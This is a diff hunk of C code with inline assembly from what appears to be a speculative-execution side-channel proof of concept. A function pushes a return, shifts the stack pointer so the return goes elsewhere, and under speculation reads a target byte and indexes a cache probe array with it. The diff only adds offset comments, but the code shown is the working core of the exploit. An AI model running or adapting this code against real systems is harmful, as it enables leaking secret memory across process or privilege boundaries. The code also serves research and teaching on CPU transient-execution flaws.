@@ -34,25 +34,25 @@ uint64_t get_time(void *addr){
 
 void trigger_speculative_execution(void *addr, void *L1){
 	__asm__ __volatile__(
-		"mfence\n"
-		"call delay_commit\n"
-		"movzbl (%rdi),%eax\n"
-		"shl    $0xc,%eax\n"
-		"movzbl (%rsi,%rax,1),%eax\n"
+		"mfence\n"						// +0
+		"call delay_commit\n"			// +1
+		"movzbl (%rdi),%eax\n"			// +2
+		"shl    $0xc,%eax\n"			// +3
+		"movzbl (%rsi,%rax,1),%eax\n"	// +4
 	);
 }
 
 void delay_commit(void){
 	__asm__ __volatile__(
-		"xorps  %xmm0,%xmm0\n"		
-		"sqrtpd %xmm0,%xmm0\n"
-		"sqrtpd %xmm0,%xmm0\n"
-		"sqrtpd %xmm0,%xmm0\n"
-		"sqrtpd %xmm0,%xmm0\n"
-		"movd   %xmm0,%eax\n"
-		"lea    0x10(%rsp,%rax,1),%rsp\n"
-		"pop	%rbp\n"
-		"retq\n"
+		"xorps  %xmm0,%xmm0\n"			// +0
+		"sqrtpd %xmm0,%xmm0\n"			// +1
+		"sqrtpd %xmm0,%xmm0\n"			// +2
+		"sqrtpd %xmm0,%xmm0\n"			// +3
+		"sqrtpd %xmm0,%xmm0\n"			// +4
+		"movd   %xmm0,%eax\n"			// +5
+		"lea    0x10(%rsp,%rax,1),%rsp\n"//+6
+		"pop	%rbp\n"					// +7
+		"retq\n"						// +
 	);
 }
 
